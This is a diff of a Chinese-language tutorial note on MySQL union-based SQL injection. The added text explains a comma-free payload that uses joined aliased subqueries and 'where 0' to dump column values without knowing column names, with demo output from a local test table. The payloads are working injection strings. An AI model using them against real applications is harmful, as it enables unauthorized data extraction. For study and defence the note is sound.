@@ -102,6 +102,7 @@ mysql> select id,name,pwd from newtable where id='111' union select 1,(select gr
 +------+-----------------+------+
 1 row in set (0.01 sec)
 ```
+
 payload:
 ``` sql
 select group_concat(`2`) from (select 1,2,3 union select * from newtable)c)
@@ -109,6 +110,25 @@ select group_concat(`2`) from (select 1,2,3 union select * from newtable)c)
 -- 无逗号版本:
 union select group_concat(a) from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from newtable)x
 ```
+
+这里稍微解释一下无逗号版本的语法
+``` sql 
+mysql> select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t union select * from newtable;
++------+------+----------+
+| a    | b    | c        | << 重点看这里
++------+------+----------+
+|    1 | 2    | 3        | << 使用where 0去除
+|    1 | zww  | 123456   |
+|    2 | zww2 | 1234567  |
+|    3 | zww3 | 12345678 |
++------+------+----------+
+4 rows in set (0.00 sec)
+```
+`` (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t `` 会生成一个列名为a, b, c，数据为1，2，3的表
+
+使用union将目的表中的数据进行合并（此时表名还是a, b, c，详见刚开始的分析）
+
+where 0表示第一个表中不选择任何数据 
 
 总体来说，使用的还是union注入的思路，只是这里将其中的一个列换成我们要填入的payload即可
 
